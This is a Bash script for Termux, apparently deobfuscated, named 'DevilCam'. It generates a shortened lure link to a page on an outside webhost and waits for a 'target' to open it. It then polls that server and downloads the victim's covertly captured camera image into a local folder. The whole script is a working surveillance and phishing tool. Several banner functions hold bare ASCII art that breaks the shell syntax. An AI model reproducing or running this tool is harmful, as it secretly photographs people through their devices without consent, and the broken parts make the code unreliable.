#!system/usr/bin/bash
# Decrypted By : X - MrG3P5

function Percent(){
    message="$1"
    max=$2
        i=0
        while [ $i -le $max ]; do
            echo -ne "\r${G}${D}$message ${C}$i${D} %"
            sleep $3
            let i++
        done
}

mulai(){

url="https://mrslyker.000webhostapp.com/Termux/devilcam/notfound.php"
urldelete="https://mrslyker.000webhostapp.com/Termux/devilcam/delete.php"

green='\033[32;1m'

if [[ ! -d DevilImage ]];then
mkdir DevilImage
fi

  echo -e "\033[32;1m[?] Enter file name"
  read file

  sleep 1
  Percent "[+] Creating DevilCam..." 100 0.1
  deleted=$(curl -s "https://mrslyker.000webhostapp.com/Termux/devilcam/result/$file.txt" -L | grep -o 'Page Not Found - error 404'; echo $?)
  if [[ $deleted == '1' ]];then
  curl -s "https://mrslyker.000webhostapp.com/Termux/devilcam/delete.php?file=$file"
  fi
  sleep 1
 echo -e "\033[32;1m"
# echo -e "[*] Url : [ https://mrslyker.000webhostapp.com/Termux/devilcam/notfound.php?cam=$file ]"
  hasilurl="https://mrslyker.000webhostapp.com/Termux/devilcam/notfound.php?cam=$file"
  bitly=$(curl -s "https://mrslyker.000webhostapp.com/Termux/sorturl/bitly.php?url=$hasilurl")
# cutly=$(curl -s "https://mrslyker.000webhostapp.com/Termux/sorturl/sorturl.php?url=$hasilurl")
  echo -e "\033[32;1m[*] Link : [  $bitly  ]"
  sleep 2
  echo -e "\033[32;1mWaiting target to open link"
  sleep 1
  echo -e "\033[32;1mPress CTRL + C to exit"

while [[ true ]];do
check=$(curl -s "https://mrslyker.000webhostapp.com/Termux/devilcam/result/$file.txt" -L | grep -o 'Page Not Found - error 404'; echo $?)
  if [[ $check == '1' ]];then
  echo -e "\033[32;1mTarget opened link"
 imagename=$(curl -s "https://mrslyker.000webhostapp.com/Termux/devilcam/result/$file.txt")
# image=$(curl -s "https://mrslyker.000webhostapp.com/Termux/devilcam/cam/$imagename"
# checkimage=$(curl -s "https://mrslyker.000webhostapp.com/Termux/devilcam/cam/$imagename" -L | grep -o 'Page Not Found - error 404'; echo $?)
  cd DevilImage
# cd ../../../../DevilImage
  curl -O "https://mrslyker.000webhostapp.com/Termux/devilcam/cam/$imagename" &> /dev/null
  cd ../
  echo -e "\033[32;1m[*] Image saved to folder DevilImage"
  sleep 1
  exit
  fi
done
}

banner(){


██████╗░███████╗██╗░░░██╗██╗██╗░░░░░
██╔══██╗██╔════╝██║░░░██║██║██║░░░░░
██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░
██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░
██████╔╝███████╗░░╚██╔╝░░██║███████╗
╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝
░█████╗░░█████╗░███╗░░░███╗
██╔══██╗██╔══██╗████╗░████║
██║░░╚═╝███████║██╔████╔██║
██║░░██╗██╔══██║██║╚██╔╝██║
╚█████╔╝██║░░██║██║░╚═╝░██║
░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝

}

banner2(){

🇩​​​​​🇪​​​​​🇻​​​​​🇮​​​​​🇱​​​​​🇨​​​​​🇦​​​​​🇲​​​​​

}

banner3(){

printf ""
printf "░░▄▄░▄███▄"
printf "▄▀▀▀▀░▄▄▄░▀▀▀▀▄"
printf "█▒▒▒▒█░░░█▒▒▒▒█"
printf "█▒▒▒▒▀▄▄▄▀▒▒▒▒█"
printf "▀▄▄▄▄▄▄▄▄▄▄▄▄▄▀"
printf ""

}

banner4(){


█▀▄ █▀▀ █░█ █ █░░ █▀▀ ▄▀█ █▀▄▀█
█▄▀ ██▄ ▀▄▀ █ █▄▄ █▄▄ █▀█ █░▀░█

}

logo(){
echo -e "\033[32;1m"
echo -e "\033[32;1m██████╗ ███████╗██╗   ██╗██╗██╗     \033[33;1m ██████╗ █████╗ ███╗   ███╗"
echo -e "\033[32;1m██╔══██╗██╔════╝██║   ██║██║██║     \033[33;1m██╔════╝██╔══██╗████╗ ████║"
echo -e "\033[32;1m██║  ██║█████╗  ██║   ██║██║██║     \033[33;1m██║     ███████║██╔████╔██║"
echo -e "\033[32;1m██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║     \033[33;1m██║     ██╔══██║██║╚██╔╝██║"
echo -e "\033[32;1m██████╔╝███████╗ ╚████╔╝ ██║███████╗\033[33;1m╚██████╗██║  ██║██║ ╚═╝ ██║"
echo -e "\033[32;1m╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝\033[33;1m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝"
echo -e "\033[32;1mAuthor : MrSlyker"
echo -e "\033[32;1mGithub : https://github.com/MrSlyker"
echo -e "\033[32;1m"
}

banner6(){

  ▄▄ ▄███▄
▄▀▀▀▀░▄▄▄░▀▀▀▀▄
█▒▒▒▒█░░░█▒▒▒▒█
█▒▒▒▒▀▄▄▄▀▒▒▒▒█
▀▄▄▄▄▄▄▄▄▄▄▄▄▄▀

    █▀▄ █▀▀ █░█ █ █░░ █▀▀ ▄▀█ █▀▄▀█
    █▄▀ ██▄ ▀▄▀ █ █▄▄ █▄▄ █▀█ █░▀░█

}

if test -z "$(which curl)";then
sleep 1
echo -e "\033[31;1m[!] Package not installed"
sleep 1
echo -e "\033[31;1m[*] Install package..."
pkg install curl -y &> /dev/nul
fi

sleep 1
clear
sleep 1
logo
mulai
